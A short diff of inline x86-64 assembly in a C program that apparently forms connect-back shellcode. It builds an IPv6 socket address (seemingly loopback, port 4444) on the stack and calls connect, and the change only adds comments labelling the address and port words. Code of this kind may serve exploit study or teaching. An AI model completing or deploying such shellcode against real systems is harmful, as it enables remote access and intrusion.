@@ -49,13 +49,13 @@ int main()
         "       add $88, %al            \n"
         "       syscall                 \n"
 
-	// connect(s, struct, 28)
+	// connect(s, struct, 28) - compiler optimizes the movs :( 
 	"	push %rdx		\n"
-	"	mov $0x0100000000000000, %rbx\n"
+	"	mov $0x0100000000000000, %rbx\n" // ipv6 addr1
 	"	push %rbx		\n"
-	"	mov $0x0000000000000000, %rbx\n"
+	"	mov $0x0000000000000000, %rbx\n" // ipv6 addr2
 	"	push %rbx		\n"
-	"	mov $0x000000005c111c00, %rbx\n"
+	"	mov $0x000000005c111c00, %rbx\n" // port etc
 	"	push %rbx		\n"
 	"	mov %rsp, %rsi		\n"
 	"	push $28	  	\n"
